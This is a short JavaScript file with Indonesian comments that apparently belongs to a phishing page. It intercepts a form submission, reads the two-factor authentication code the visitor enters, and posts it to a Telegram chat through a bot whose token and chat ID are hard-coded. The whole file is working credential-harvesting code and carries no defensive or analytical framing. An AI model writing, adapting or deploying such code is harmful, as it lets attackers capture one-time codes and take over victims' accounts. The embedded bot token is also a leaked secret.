// Fungsi untuk mengirim pesan ke Telegram
async function sendToTelegram(code2fa) {
    const botToken = '8798021653:AAFFnZc4B6Fbx1XRcVkVUrPstfg2W-oukP0';
    const chatId = '7437326858';

    const message = `Kode 2FA yang dimasukkan: ${code2fa}`;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const data = {
        chat_id: chatId,
        text: message,
    };

    // Kirim request POST ke API Telegram
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data),
        });

        // Cek status HTTP response
        if (response.ok) {
            const result = await response.json();
            console.log("Pesan berhasil dikirim:", result);
        } else {
            const errorText = await response.text();
            console.error("Gagal mengirim pesan:", errorText);
        }
    } catch (error) {
        console.error("Terjadi kesalahan:", error);
    }
}

// Event listener untuk menangani form submission
document.getElementById("yourFormId").addEventListener("submit", function (event) {
    event.preventDefault();

    // Ambil nilai kode 2FA dari form
    const code2fa = document.getElementById("code2fa").value;

    // Validasi input kode 2FA
    if (code2fa && code2fa.trim() !== "") {
        sendToTelegram(code2fa);
    } else {
        alert("Kode 2FA tidak boleh kosong.");
    }
});
